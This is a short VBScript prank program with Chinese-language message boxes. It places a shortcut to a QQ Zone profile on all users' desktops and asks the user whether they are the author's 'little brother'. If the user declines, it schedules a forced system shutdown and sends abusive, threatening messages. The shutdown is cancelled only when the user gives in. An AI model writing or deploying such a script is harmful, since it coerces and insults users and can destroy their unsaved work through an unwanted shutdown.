Set Seven = WScript.CreateObject("WScript.Shell")
strDesktop = Seven.SpecialFolders("AllUsersDesktop")
set oShellLink = Seven.CreateShortcut(strDesktop & "\Seven.url")
oShellLink.TargetPath = "http://user.qzone.qq.com/985390927"
oShellLink.Save
Sub ak47
Set oShellLink=Nothing
seven.Run "notepad",3
WScript.Sleep 300
seven.SendKeys " I "
WScript.Sleep 300
seven.SendKeys "L"
WScript.Sleep 300
seven.SendKeys "o"
WScript.Sleep 300
seven.SendKeys "v"
WScript.Sleep 300
seven.SendKeys "e "
WScript.Sleep 300
seven.SendKeys "Y"
WScript.Sleep 300
seven.SendKeys "o"
WScript.Sleep 300
seven.SendKeys "u Too"
End Sub
se_key = (MsgBox("你是我弟弟?",4,"Seven_下午"&Time))
If se_key=6 Then
Call ak47
Else
seven.Run "shutdown.exe -s -t 600"
agn=(MsgBox ("你死定了,在给你一次机会，你是不是",52,"提示"))
If agn=6 Then
seven.Run "shutdown.exe -a"
MsgBox "好弟弟，你真乖",,"恭喜"
WScript.Sleep 300
Call ak47
Else
MsgBox "你可以去死了",48,"wo cao"
End If
End If